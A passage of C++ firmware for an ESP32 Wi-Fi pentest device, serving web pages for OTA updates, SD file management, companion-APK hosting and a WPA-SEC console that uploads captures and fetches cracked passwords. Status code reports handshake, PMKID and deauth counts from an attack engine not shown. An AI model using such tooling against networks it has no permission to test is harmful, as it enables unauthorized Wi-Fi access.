  border-radius:999px;
  font-size:13px;
}
.nd-nav a:hover,.nd-nav a.active{
  color:var(--text);
  border-color:rgba(41,245,255,.72);
  background:linear-gradient(120deg,rgba(41,245,255,.2),rgba(255,58,217,.16));
  box-shadow:0 0 14px rgba(41,245,255,.2);
}
.nd-main{display:grid;gap:14px}
.nd-grid-2{display:grid;gap:14px;grid-template-columns:repeat(2,minmax(0,1fr))}
.nd-panel{
  background:linear-gradient(180deg,rgba(21,33,56,.84),rgba(14,22,38,.86));
  border:var(--border);
  border-radius:var(--radius);
  box-shadow:var(--shadow);
  padding:14px;
}
.nd-panel h2,.nd-panel h3{
  margin:0 0 10px;
  font-size:1rem;
  letter-spacing:.08em;
  text-transform:uppercase;
  color:var(--neon-cyan);
}
p{margin:0 0 10px;line-height:1.45}
a{color:var(--neon-cyan)}
a:hover{color:var(--text)}
.nd-actions{display:flex;flex-wrap:wrap;gap:8px}
.nd-btn,.nd-btn-ghost,.nd-btn-danger{
  appearance:none;
  border:1px solid transparent;
  border-radius:10px;
  padding:9px 13px;
  text-decoration:none;
  cursor:pointer;
  font-weight:700;
  letter-spacing:.03em;
}
.nd-btn{
  background:linear-gradient(135deg,var(--neon-cyan),#00c1ff);
  color:#04111a;
  box-shadow:var(--glow);
}
.nd-btn-ghost{
  background:rgba(41,245,255,.08);
  border-color:rgba(41,245,255,.45);
  color:var(--text);
}
.nd-btn-danger{
  background:rgba(255,77,95,.2);
  border-color:rgba(255,77,95,.7);
  color:#ffeef1;
}
input,select,textarea{
  width:100%;
  border-radius:10px;
  border:1px solid rgba(151,170,200,.35);
  background:rgba(5,8,14,.85);
  color:var(--text);
  padding:9px 10px;
}
input[type='file']{padding:9px}
input:focus,select:focus,textarea:focus,.nd-btn:focus,.nd-btn-ghost:focus,.nd-btn-danger:focus,.nd-nav-toggle:focus,a:focus{
  outline:2px solid var(--neon-magenta);
  outline-offset:2px;
}
.nd-help{color:var(--muted);font-size:13px}
.nd-status{
  display:inline-flex;
  align-items:center;
  gap:6px;
  border-radius:999px;
  padding:4px 10px;
  font-size:12px;
  font-weight:700;
  letter-spacing:.04em;
  border:1px solid rgba(151,170,200,.3);
}
.nd-ok{color:#cbffd4;border-color:rgba(154,255,58,.6);background:rgba(154,255,58,.15)}
.nd-warn{color:#ffe2ad;border-color:rgba(255,191,58,.7);background:rgba(255,191,58,.16)}
.nd-bad{color:#ffd0d5;border-color:rgba(255,77,95,.75);background:rgba(255,77,95,.16)}
.nd-table{width:100%;border-collapse:collapse}
.nd-table th,.nd-table td{
  border-bottom:1px solid rgba(151,170,200,.18);
  padding:8px 6px;
  text-align:left;
  vertical-align:top;
}
.nd-table th{color:var(--neon-cyan);font-size:.8rem;text-transform:uppercase;letter-spacing:.08em}
.nd-inline{display:inline}
.nd-pre{
  background:rgba(3,5,10,.88);
  border:1px solid rgba(151,170,200,.22);
  border-radius:10px;
  padding:10px;
  overflow:auto;
  max-height:65vh;
  white-space:pre-wrap;
  color:#dbffe5;
}
.nd-toast{
  position:fixed;
  right:14px;
  bottom:14px;
  z-index:9;
  background:rgba(6,10,18,.92);
  border:1px solid rgba(41,245,255,.5);
  border-radius:10px;
  padding:8px 11px;
  box-shadow:var(--glow);
  transform:translateY(12px);
  opacity:0;
  transition:all .2s ease;
}
.nd-toast.show{transform:translateY(0);opacity:1}
.nd-toast.bad{border-color:rgba(255,77,95,.7)}
@media (max-width:860px){
  .nd-grid-2{grid-template-columns:1fr}
  .nd-nav-toggle{display:inline-block}
  .nd-nav{display:none}
  body.nav-open .nd-nav{display:flex}
}
)CSS";
}

static String neonPageStart(const String& title,
                            const String& subtitle,
                            const String& activeNav,
                            int refreshSeconds = 0,
                            const String& toastMessage = "",
                            const String& toastType = "ok") {
  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
  if (refreshSeconds > 0) {
    html += "<meta http-equiv='refresh' content='";
    html += String(refreshSeconds);
    html += "'>";
  }
  html += "<title>";
  html += escapeHtml(title);
  html += "</title><style>";
  html += neonBaseCss();
  html += "</style></head><body";
  if (!toastMessage.isEmpty()) {
    html += " data-toast='";
    html += escapeHtml(toastMessage);
    html += "' data-toast-type='";
    html += escapeHtml(toastType);
    html += "'";
  }
  html += "><div class='nd-grid'></div><div class='nd-scan'></div><div class='nd-wrap'>";
  html += "<header class='nd-topbar'><p class='nd-kicker'>NEONDRIVE // firmware web ops</p><h1>";
  html += escapeHtml(title);
  html += "</h1>";
  if (!subtitle.isEmpty()) {
    html += "<p class='nd-subtitle'>";
    html += subtitle;
    html += "</p>";
  }
  html += "<button class='nd-nav-toggle' type='button' aria-label='Toggle navigation' onclick='document.body.classList.toggle(\"nav-open\")'>Menu</button>";
  html += "<nav class='nd-nav'>";
  html += neonNavLink("/", "Home", activeNav);
  html += neonNavLink("/android", "Android", activeNav);
  html += neonNavLink("/sd", "SD Manager", activeNav);
  html += neonNavLink("/wpasec", "WPA-SEC", activeNav);
  html += neonNavLink("/yoink/log", "YOINK Log", activeNav);
  html += neonNavLink("/keys/config", "API Keys", activeNav);
  html += "</nav></header><main class='nd-main'>";
  return html;
}

static String neonPageEnd() {
  return R"HTML(</main></div><script>
(function(){
  var d=document;
  function toast(msg,type){
    if(!msg){return;}
    var el=d.createElement('div');
    el.className='nd-toast'+(type==='bad'?' bad':'');
    el.textContent=msg;
    d.body.appendChild(el);
    requestAnimationFrame(function(){el.classList.add('show');});
    setTimeout(function(){el.classList.remove('show');setTimeout(function(){el.remove();},220);},2400);
  }
  d.querySelectorAll('form').forEach(function(f){
    f.addEventListener('submit',function(){
      var b=f.querySelector("button[type='submit']");
      if(!b){return;}
      if(!b.dataset.txt){b.dataset.txt=b.textContent;}
      b.disabled=true;
      b.textContent='Working...';
    });
  });
  toast(d.body.getAttribute('data-toast'), d.body.getAttribute('data-toast-type'));
})();
</script></body></html>)HTML";
}

static void startWebServer() {
  if (webServerRunning) {
    Serial.println("[web] WebServer already running");
    return;
  }

  webServerRunning = true;
  wifiConnectStatus = "Starting WebServer...";

  Serial.printf("[web] Starting WebServer on port %d\n", webServerPort);

  // Root handler - OTA + companion app + WPA-SEC quick links
  webServer.on("/", HTTP_GET, [](){ 
    Serial.println("[web] GET /");
    bool sdOk = sdReady || mountSdCard(false);
    bool hasApk = sdOk && SD.exists(androidApkPath);
    bool hasWpaResults = sdOk && SD.exists(wpasecResultsPath);

    String appBlock = "<section class='nd-panel'><h2>Android Companion</h2>";
    appBlock += "<p>Manage install page and APK directly from this unit.</p>";
    appBlock += "<p><span class='nd-status ";
    appBlock += hasApk ? "nd-ok'>APK PRESENT</span>" : "nd-warn'>APK MISSING</span>";
    appBlock += "</p><div class='nd-actions'>";
    appBlock += "<a class='nd-btn' href='/android'>Open Android Page</a>";
    if (hasApk) {
      appBlock += "<a class='nd-btn-ghost' href='/android.apk'>Direct APK Download</a>";
    } else {
      appBlock += "<span class='nd-help'>Upload /CYDCompanion.apk from Android page.</span>";
    }
    appBlock += "</div></section>";

    String wpaBlock = "<section class='nd-panel'><h2>WPA-SEC</h2>";
    if (cfg.wpasec_apikey.isEmpty()) {
      wpaBlock += "<p><span class='nd-status nd-bad'>API KEY NOT CONFIGURED</span></p>";
      wpaBlock += "<div class='nd-actions'><a class='nd-btn-danger' href='/wpasec/config'>Configure API Key</a></div>";
    } else {
      wpaBlock += "<p><span class='nd-status nd-ok'>API KEY CONFIGURED</span></p>";
      wpaBlock += "<p>Push captures and pull cracked results.</p><div class='nd-actions'>";
      wpaBlock += "<a class='nd-btn' href='/wpasec'>Open Console</a>";
      wpaBlock += "<a class='nd-btn-ghost' href='/wpasec/config'>Edit Config</a>";
      if (hasWpaResults) wpaBlock += "<a class='nd-btn-ghost' href='/wpasec/results'>View Local Results</a>";
      wpaBlock += "</div><p><a href='https://wpa-sec.stanev.org/' target='_blank' rel='noopener noreferrer'>Open WPA-SEC Portal</a></p>";
    }
    wpaBlock += "</section>";

    String toolsBlock = "<section class='nd-panel'><h2>Pentest Quick Links</h2>";
    toolsBlock += "<div class='nd-actions'>";
    toolsBlock += "<a class='nd-btn-ghost' href='/android'>Android Companion</a>";
    toolsBlock += "<a class='nd-btn-ghost' href='/wpasec'>WPA-SEC Console</a>";
    toolsBlock += "<a class='nd-btn-ghost' href='/sd'>SD File Manager</a>";
    toolsBlock += "<a class='nd-btn-ghost' href='/android.apk'>Download APK</a>";
    toolsBlock += "<a class='nd-btn-ghost' href='/wpasec/results/download'>Download WPA-SEC Results</a>";
    toolsBlock += "</div></section>";

    String html = neonPageStart("CYD OTA Firmware Update",
                                "Upload firmware and access companion tooling.",
                                "/");
    html += "<section class='nd-panel'><h2>Firmware Upload</h2>";
    html += "<p>Flash a new firmware binary package to this device.</p>";
    html += "<form method='POST' action='/update' enctype='multipart/form-data'>";
    html += "<input type='file' name='update' accept='.bin' required>";
    html += "<p class='nd-help'>Only firmware .bin files generated for this hardware target.</p>";
    html += "<div class='nd-actions'><button class='nd-btn' type='submit'>Update Firmware</button></div>";
    html += "</form></section>";
    html += "<section class='nd-grid-2'>" + appBlock + wpaBlock + "</section>";
    html += toolsBlock;
    html += neonPageEnd();
    webServer.send(200, "text/html", html);
  });

  webServer.on("/api/status", HTTP_GET, [](){
    JsonDocument doc;
    doc["ok"] = true;
    doc["name"] = "CYD-NEON";
    doc["mode"] = (int)screen;
    doc["autoMode"] = autoModeStr(autoMode);
    doc["sniffActive"] = sniffActive;
    doc["lockChannel"] = lockChannel;
    doc["apMode"] = apMode;
    doc["webServer"] = webServerRunning;
    doc["sdReady"] = sdReady;
    doc["usb_msc_active"] = nd_usb_msc_active();
    doc["usb_msc_enabled"] = nd_usb_msc_enabled();
    doc["sd_host_mounted"] = nd_usb_msc_host_mounted();
    doc["sd_app_locked"] = nd_usb_msc_sd_app_locked();
    doc["packets"] = sniffPacketCount;
    doc["beacons"] = monBeaconHits;
    doc["handshakes"] = monHandshakeHits;
    doc["ip_sta"] = WiFi.localIP().toString();
    doc["ip_ap"] = WiFi.softAPIP().toString();
    // YOINK status if active
    if (autoMode == AutoMode::Y0INK && YoinkEngine::isRunning()) {
      JsonObject yoink = doc["yoink"].to<JsonObject>();
      yoink["state"] = YoinkEngine::getStateStr();
      yoink["hs"] = YoinkEngine::getHandshakeCount();
      yoink["pmkid"] = YoinkEngine::getPmkidCount();
      yoink["nets"] = YoinkEngine::getNetworkCount();
      yoink["deauths"] = YoinkEngine::getDeauthCount();
      yoink["target"] = YoinkEngine::getTargetSSID();
    }
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/api/usb/msc", HTTP_ANY, [](){
    bool changed = false;
    bool enabled = nd_usb_msc_enabled();

    if (webServer.hasArg("enabled")) {
      const int want = webServer.arg("enabled").toInt();
      enabled = (want != 0);
      nd_usb_msc_set_enabled(enabled);
      // Force app-side remount path through lock checks on next SD access.
      sdReady = false;
      changed = true;
      Serial.printf("[web] /api/usb/msc enabled=%d\n", enabled ? 1 : 0);
    }

    JsonDocument doc;
    doc["ok"] = true;
    doc["changed"] = changed;
    doc["usb_msc_active"] = nd_usb_msc_active();
    doc["usb_msc_enabled"] = nd_usb_msc_enabled();
    doc["sd_host_mounted"] = nd_usb_msc_host_mounted();
    doc["sd_app_locked"] = nd_usb_msc_sd_app_locked();
    doc["sdReady"] = sdReady;
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  // Android Companion: show a temporary on-device badge while the phone is pulling from SD.
  // Use a TTL so the badge clears automatically if the app disconnects mid-transfer.
  webServer.on("/api/companion/sync", HTTP_GET, [](){
    const uint32_t now = millis();
    const bool hasActive = webServer.hasArg("active") || webServer.hasArg("on");
    const int active = hasActive ? (webServer.hasArg("active") ? webServer.arg("active").toInt() : webServer.arg("on").toInt()) : 1;
    const uint32_t ttlMs = webServer.hasArg("ttl") ? (uint32_t)webServer.arg("ttl").toInt() : 20000U;

    if (active != 0) {
      companionSyncUntilMs = now + ttlMs;
    } else {
      companionSyncUntilMs = 0;
    }

    // Draw immediately (in addition to periodic HUD ticks)
    drawCompanionSyncBadgeTick();

    JsonDocument doc;
    doc["ok"] = true;
    doc["active"] = (companionSyncUntilMs != 0) && ((int32_t)(companionSyncUntilMs - now) > 0);
    doc["ttl_ms"] = ttlMs;
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/api/console", HTTP_GET, [](){
    uint32_t since = (uint32_t)webServer.arg("since").toInt();
    int limit = webServer.hasArg("limit") ? webServer.arg("limit").toInt() : 80;
    if (limit < 1) limit = 1;
    if (limit > 200) limit = 200;

    JsonDocument doc;
    doc["ok"] = true;
    doc["next_seq"] = consoleSeq + 1;
    JsonArray lines = doc["lines"].to<JsonArray>();

    uint16_t emitted = 0;
    for (uint16_t i = 0; i < CONSOLE_RING_SIZE && emitted < (uint16_t)limit; i++) {
      const ConsoleEvent& e = consoleRing[(consoleHead + i) % CONSOLE_RING_SIZE];
      if (e.seq == 0 || e.seq <= since) continue;
      JsonObject o = lines.add<JsonObject>();
      o["seq"] = e.seq;
      o["ms"] = e.ms;
      o["level"] = e.level;
      o["tag"] = e.tag;
      o["msg"] = e.msg;
      emitted++;
    }
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/api/packets", HTTP_GET, [](){
    uint32_t since = (uint32_t)webServer.arg("since").toInt();
    int limit = webServer.hasArg("limit") ? webServer.arg("limit").toInt() : 120;
    if (limit < 1) limit = 1;
    if (limit > 260) limit = 260;

    JsonDocument doc;
    doc["ok"] = true;
    JsonArray lines = doc["lines"].to<JsonArray>();

    portENTER_CRITICAL(&packetRingMux);
    uint16_t emitted = 0;
    for (uint16_t i = 0; i < PACKET_RING_SIZE && emitted < (uint16_t)limit; i++) {
      const PacketEvent& p = packetRing[(packetHead + i) % PACKET_RING_SIZE];
      if (p.seq == 0 || p.seq <= since) continue;
      char src[18], dst[18], bssid[18];
      macToStr(p.addr2, src);
      macToStr(p.addr1, dst);
      macToStr(p.addr3, bssid);
      JsonObject o = lines.add<JsonObject>();
      o["seq"] = p.seq;
      o["ms"] = p.ms;
      o["type"] = p.type;
      o["subtype"] = p.subtype;
      o["len"] = p.len;
      o["rssi"] = p.rssi;
      o["ch"] = p.channel;
      o["src"] = src;
      o["dst"] = dst;
      o["bssid"] = bssid;
      emitted++;
    }
    doc["next_seq"] = packetSeq + 1;
    portEXIT_CRITICAL(&packetRingMux);
    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.on("/android", HTTP_GET, [](){
    Serial.println("[web] GET /android");
    bool sdOk = sdReady || mountSdCard(false);
    bool hasApk = sdOk && SD.exists(androidApkPath);

    uint32_t apkSize = 0;
    if (hasApk) {
      File f = SD.open(androidApkPath, FILE_READ);
      if (f) {
        apkSize = (uint32_t)f.size();
        f.close();
      }
    }

    String html = neonPageStart("CYD Companion Android App",
                                "Host and update CYDCompanion.apk from SD storage.",
                                "/android");
    html += "<section class='nd-panel'>";
    if (!sdOk) {
      html += "<p><span class='nd-status nd-bad'>SD CARD NOT AVAILABLE</span></p>";
      html += "<p>Insert or mount SD to upload CYDCompanion.apk.</p>";
    } else if (!hasApk) {
      html += "<p><span class='nd-status nd-warn'>APK NOT FOUND</span></p>";
      html += "<p>Expected file: <code>/CYDCompanion.apk</code> in SD root.</p>";
      html += "<p>Upload an APK below (it will be saved as /CYDCompanion.apk).</p>";
    } else {
      html += "<p><span class='nd-status nd-ok'>APK READY</span></p>";
      html += "<p>APK file: <code>CYDCompanion.apk</code></p>";
      html += "<p>Size: " + String(apkSize) + " bytes</p>";
      html += "<p><a class='nd-btn' href='/android.apk'>Download APK</a></p>";
    }
    html += "<form method='POST' action='/android/upload' enctype='multipart/form-data'>";
    html += "<h3>Upload APK</h3><p>Upload new APK to SD as <code>CYDCompanion.apk</code>.</p>";
    if (sdOk) {
      html += "<input type='file' name='apk' accept='.apk,application/vnd.android.package-archive' required>";
      html += "<div class='nd-actions'><button class='nd-btn' type='submit'>Upload APK</button></div>";
    } else {
      html += "<p>Upload disabled until SD is available.</p>";
    }
    html += "</form>";
    html += "<div class='nd-actions'><a class='nd-btn-ghost' href='/sd'>Open SD File Manager</a>";
    html += "<a class='nd-btn-ghost' href='/'>Back to OTA</a></div>";
    html += "</section>";
    html += neonPageEnd();
    webServer.send(200, "text/html", html);
  });

  webServer.on("/android/upload", HTTP_POST, [](){
    bool ok = sdReady || mountSdCard(false);
    if (!ok) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    if (androidApkUploadFile) androidApkUploadFile.close();
    bool hasApk = SD.exists(androidApkPath);
    String msg = hasApk ? "APK uploaded/updated on SD." : "APK upload failed.";
    String html = neonPageStart("Android Upload Result", "APK deployment to SD completed.", "/android");
    html += "<section class='nd-panel'><h2>";
    html += escapeHtml(msg);
    html += "</h2><div class='nd-actions'><a class='nd-btn-ghost' href='/android'>Back to Android Page</a></div></section>";
    html += neonPageEnd();
    webServer.send(200, "text/html", html);
  }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      bool ok = sdReady || mountSdCard(false);
      if (!ok) return;
      if (SD.exists(androidApkPath)) SD.remove(androidApkPath);
      androidApkUploadFile = SD.open(androidApkPath, FILE_WRITE);
      Serial.printf("[web] APK upload start: %s\n", upload.filename.c_str());
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (androidApkUploadFile) androidApkUploadFile.write(upload.buf, upload.currentSize);
    } else if (upload.status == UPLOAD_FILE_END) {
      if (androidApkUploadFile) {
        androidApkUploadFile.close();
        Serial.printf("[web] APK upload complete: %u bytes\n", upload.totalSize);
      }
    } else if (upload.status == UPLOAD_FILE_ABORTED) {
      if (androidApkUploadFile) androidApkUploadFile.close();
      if (SD.exists(androidApkPath)) SD.remove(androidApkPath);
      Serial.println("[web] APK upload aborted");
    }
  });

  webServer.on("/android.apk", HTTP_GET, [](){
    Serial.println("[web] GET /android.apk");
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    if (!SD.exists(androidApkPath)) {
      webServer.send(404, "text/plain", "CYDCompanion.apk not found on SD");
      return;
    }

    File apk = SD.open(androidApkPath, FILE_READ);
    if (!apk) {
      webServer.send(500, "text/plain", "Failed to open APK");
      return;
    }
    webServer.sendHeader("Content-Disposition", "attachment; filename=CYDCompanion.apk");
    webServer.streamFile(apk, "application/vnd.android.package-archive");
    apk.close();
  });

  webServer.on("/sd", HTTP_GET, [](){
    bool sdOk = sdReady || mountSdCard(false);
    String path = normalizeSdWebPath(webServer.arg("path"));
    if (path.isEmpty()) {
      webServer.send(400, "text/plain", "Invalid path");
      return;
    }
    if (!sdOk) {
      String html = neonPageStart("SD File Manager", "Browse and maintain SD content.", "/sd");
      html += "<section class='nd-panel'><h2>SD Card Not Available</h2>";
      html += "<p>Insert or remount SD storage, then refresh this page.</p>";
      html += "<div class='nd-actions'><a class='nd-btn-ghost' href='/'>Back Home</a></div></section>";
      html += neonPageEnd();
      webServer.send(503, "text/html", html);
      return;
    }

    if (!SD.exists(path)) {
      webServer.send(404, "text/plain", "Path not found");
      return;
    }
    File dir = SD.open(path, FILE_READ);
    if (!dir || !dir.isDirectory()) {
      if (dir) dir.close();
      webServer.send(400, "text/plain", "Path is not a directory");
      return;
    }

    String html = neonPageStart("SD File Manager",
                                "Inspect, upload, download, and remove SD files.",
                                "/sd");

    // Dropbox status banner
    html += "<section class='nd-panel'>";
    if (cfg.dropbox_token.isEmpty()) {
      html += "<p><span class='nd-status nd-bad'>Dropbox not configured</span> &mdash; "
              "<a href='/keys/config'>Add token in API Keys</a> to enable upload.</p>";
    } else {
      html += "<p><span class='nd-status nd-ok'>Dropbox ready</span> &mdash; "
              "Files upload to <b>" + escapeHtml(cfg.dropbox_folder) + "</b> in your Dropbox. "
              "<a href='/keys/config'>Edit token</a></p>";
    }
    html += "</section>";

    html += "<section class='nd-panel'><p>Current path: <b>" + escapeHtml(path) + "</b></p>";
    html += "<div class='nd-actions'><a class='nd-btn-ghost' href='/'>Home</a><a class='nd-btn-ghost' href='/android'>Android</a>";
    if (path != "/") {
      html += "<a class='nd-btn-ghost' href='/sd?path=" + urlEncodeSimple(pathParent(path)) + "'>Up</a>";
    }
    html += "</div></section>";

    html += "<section class='nd-panel'><h3>Upload File</h3>";
    html += "<form method='POST' action='/sd/upload?dir=" + urlEncodeSimple(path) + "' enctype='multipart/form-data'>";
    html += "<input type='file' name='file' required> ";
    html += "<div class='nd-actions'><button class='nd-btn' type='submit'>Upload</button></div></form></section>";

    bool dropboxReady = !cfg.dropbox_token.isEmpty();
    html += "<section class='nd-panel'><h3>Directory Entries</h3>";
    html += "<form id='bulkDeleteForm' method='POST' action='/sd/delete-multi' onsubmit='return confirmBulkDelete()'>";
    html += "<input type='hidden' name='back' value='" + escapeHtml(path) + "'>";
    html += "<div class='nd-actions'>"
            "<button class='nd-btn-ghost' type='button' onclick='toggleAllEntries(true)'>Select All</button>"
            "<button class='nd-btn-ghost' type='button' onclick='toggleAllEntries(false)'>Clear</button>"
            "<button class='nd-btn-danger' type='submit'>Delete Selected</button>"
            "</div>";
    html += "<table class='nd-table'><tr><th>Select</th><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>";
    while (true) {
      File entry = dir.openNextFile();
      if (!entry) break;
      String fullPath = entry.name();
      if (!fullPath.startsWith("/")) {
        fullPath = path;
        if (!fullPath.endsWith("/")) fullPath += "/";
        fullPath += entry.name();
      }
      String baseName = fullPath.substring(fullPath.lastIndexOf('/') + 1);
      bool isDir = entry.isDirectory();
      uint32_t size = (uint32_t)entry.size();
      entry.close();

      html += "<tr><td><input class='nd-sd-select' type='checkbox' name='path' value='" + escapeHtml(fullPath) + "'></td>";
      html += "<td>" + escapeHtml(baseName) + "</td>";
      html += isDir ? "<td>dir</td>" : "<td>file</td>";
      html += "<td>" + (isDir ? String("-") : String(size)) + "</td><td class='nd-actions-cell'>";
      if (isDir) {
        html += "<a class='nd-btn-ghost' href='/sd?path=" + urlEncodeSimple(fullPath) + "'>Open</a> ";
      } else {
        html += "<a class='nd-btn-ghost' href='/sd/get?path=" + urlEncodeSimple(fullPath) + "'>Download</a> ";
        if (dropboxReady) {
          html += "<button class='nd-btn-ghost' type='button' "
                  "onclick='dbUpload(this,\"" + escapeHtml(fullPath) + "\")'>&#8599; Dropbox</button> ";
        }
      }
      html += "<form class='nd-inline' method='POST' action='/sd/delete' onsubmit='return confirm(\"Delete " + escapeHtml(baseName) + "?\")'>";
      html += "<input type='hidden' name='path' value='" + escapeHtml(fullPath) + "'>";
      html += "<input type='hidden' name='back' value='" + escapeHtml(path) + "'>";
      html += "<button class='nd-btn-danger' type='submit'>Delete</button></form>";
      html += "</td></tr>";
    }
    dir.close();
    html += "</table></form></section>";
    html += R"JS(<script>
function toggleAllEntries(nextState) {
  document.querySelectorAll('.nd-sd-select').forEach(cb => cb.checked = !!nextState);
}
function confirmBulkDelete() {
  const selected = Array.from(document.querySelectorAll('.nd-sd-select')).filter(cb => cb.checked).length;
  if (selected < 1) {
    alert('Select at least one file or directory to delete.');
    return false;
  }
  return confirm('Delete ' + selected + ' selected item(s)?');
}
function dbUpload(btn, path) {
  btn.disabled = true;
  btn.textContent = 'Uploading...';
  fetch('/sd/dropbox/upload', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'path=' + encodeURIComponent(path)
  }).then(r => r.json()).then(d => {
    btn.textContent = d.ok ? '✓ Uploaded' : '✗ ' + (d.error || 'failed');
    btn.style.color = d.ok ? '#0f0' : '#f44';
    if (!d.ok) btn.disabled = false;
  }).catch(e => {
    btn.textContent = '✗ Error';
    btn.style.color = '#f44';
    btn.disabled = false;
  });
}
</script>)JS";
    html += neonPageEnd();
    webServer.send(200, "text/html", html);
  });

  webServer.on("/sd/get", HTTP_GET, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    String path = normalizeSdWebPath(webServer.arg("path"));
    if (path.isEmpty() || path == "/") {
      webServer.send(400, "text/plain", "Invalid path");
      return;
    }
    if (!SD.exists(path)) {
      webServer.send(404, "text/plain", "File not found");
      return;
    }
    File f = SD.open(path, FILE_READ);
    if (!f || f.isDirectory()) {
      if (f) f.close();
      webServer.send(400, "text/plain", "Not a file");
      return;
    }
    String name = path.substring(path.lastIndexOf('/') + 1);
    String ct = "application/octet-stream";
    if (name.endsWith(".txt") || name.endsWith(".log") || name.endsWith(".json") || name.endsWith(".csv") || name.endsWith(".22000")) {
      ct = "text/plain";
    }
    webServer.sendHeader("Content-Disposition", "attachment; filename=\"" + name + "\"");
    webServer.streamFile(f, ct);
    f.close();
  });

  webServer.on("/sd/delete", HTTP_POST, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    String path = normalizeSdWebPath(webServer.arg("path"));
    String back = normalizeSdWebPath(webServer.arg("back"));
    if (back.isEmpty()) back = "/";
    if (path.isEmpty() || path == "/") {
      webServer.send(400, "text/plain", "Invalid delete path");
      return;
    }
    bool ok = removeSdPathRecursive(path);
    String html = neonPageStart("SD Delete Result", "Delete operation completed.", "/sd");
    html += "<section class='nd-panel'><h2>";
    html += ok ? "Deleted: " : "Delete failed: ";
    html += escapeHtml(path) + "</h2>";
    html += "<div class='nd-actions'><a class='nd-btn-ghost' href='/sd?path=" + urlEncodeSimple(back) + "'>Back to SD File Manager</a></div></section>";
    html += neonPageEnd();
    webServer.send(ok ? 200 : 500, "text/html", html);
  });

  webServer.on("/sd/delete-multi", HTTP_POST, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    String back = normalizeSdWebPath(webServer.arg("back"));
    if (back.isEmpty()) back = "/";

    int selected = 0;
    int deleted = 0;
    String failedItems;
    for (int i = 0; i < webServer.args(); i++) {
      if (webServer.argName(i) != "path") continue;
      String path = normalizeSdWebPath(webServer.arg(i));
      if (path.isEmpty() || path == "/") continue;
      selected++;
      if (removeSdPathRecursive(path)) {
        deleted++;
      } else {
        if (!failedItems.isEmpty()) failedItems += ", ";
        failedItems += path;
      }
    }

    String html = neonPageStart("SD Bulk Delete Result", "Bulk delete operation completed.", "/sd");
    html += "<section class='nd-panel'><h2>Deleted " + String(deleted) + " of " + String(selected) + " item(s)</h2>";
    if (!failedItems.isEmpty()) {
      html += "<p>Failed: <code>" + escapeHtml(failedItems) + "</code></p>";
    }
    html += "<div class='nd-actions'><a class='nd-btn-ghost' href='/sd?path=" + urlEncodeSimple(back) + "'>Back to SD File Manager</a></div></section>";
    html += neonPageEnd();
    webServer.send((selected > 0 && deleted == selected) ? 200 : 500, "text/html", html);
  });

  webServer.on("/sd/upload", HTTP_POST, [](){
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "text/plain", "SD card not available");
      return;
    }
    String backDir = normalizeSdWebPath(webServer.arg("dir"));
    if (backDir.isEmpty()) backDir = "/";
    String html = neonPageStart("SD Upload Result", "Upload operation completed.", "/sd");
    html += "<section class='nd-panel'>";
    if (sdUploadOk) {
      html += "<h2>Upload complete</h2>";
    } else {
      html += "<h2>Upload failed</h2><p>Check file/path and retry.</p>";
    }
    html += "<div class='nd-actions'><a class='nd-btn-ghost' href='/sd?path=" + urlEncodeSimple(backDir) + "'>Back to SD File Manager</a></div></section>";
    html += neonPageEnd();
    webServer.send(sdUploadOk ? 200 : 500, "text/html", html);
  }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      sdUploadOk = false;
      String uploadDir = normalizeSdWebPath(webServer.arg("dir"));
      if (uploadDir.isEmpty()) uploadDir = "/";
      bool sdOk = sdReady || mountSdCard(false);
      if (!sdOk) return;

      String filename = upload.filename;
      filename.replace('\\', '/');
      int slash = filename.lastIndexOf('/');
      if (slash >= 0) filename = filename.substring(slash + 1);
      if (filename.isEmpty()) return;

      String target = uploadDir;
      if (!target.endsWith("/")) target += "/";
      target += filename;
      if (SD.exists(target)) SD.remove(target);
      if (androidApkUploadFile) androidApkUploadFile.close();
      androidApkUploadFile = SD.open(target, FILE_WRITE);
      if (!androidApkUploadFile) return;
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      if (androidApkUploadFile) {
        size_t wr = androidApkUploadFile.write(upload.buf, upload.currentSize);
        if (wr != upload.currentSize) {
          sdUploadOk = false;
          androidApkUploadFile.close();
        }
      }
    } else if (upload.status == UPLOAD_FILE_END) {
      if (androidApkUploadFile) {
        androidApkUploadFile.close();
        sdUploadOk = true;
      }
    } else if (upload.status == UPLOAD_FILE_ABORTED) {
      if (androidApkUploadFile) androidApkUploadFile.close();
      sdUploadOk = false;
    }
  });

  // ── Dropbox file upload from SD ──────────────────────────────────────────
  webServer.on("/sd/dropbox/upload", HTTP_POST, [](){
    if (cfg.dropbox_token.isEmpty()) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"Dropbox token not configured\"}");
      return;
    }
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      webServer.send(503, "application/json", "{\"ok\":false,\"error\":\"SD not available\"}");
      return;
    }
    String path = normalizeSdWebPath(webServer.arg("path"));
    if (path.isEmpty() || path == "/" || path.indexOf("..") >= 0) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"Invalid path\"}");
      return;
    }
    if (!SD.exists(path)) {
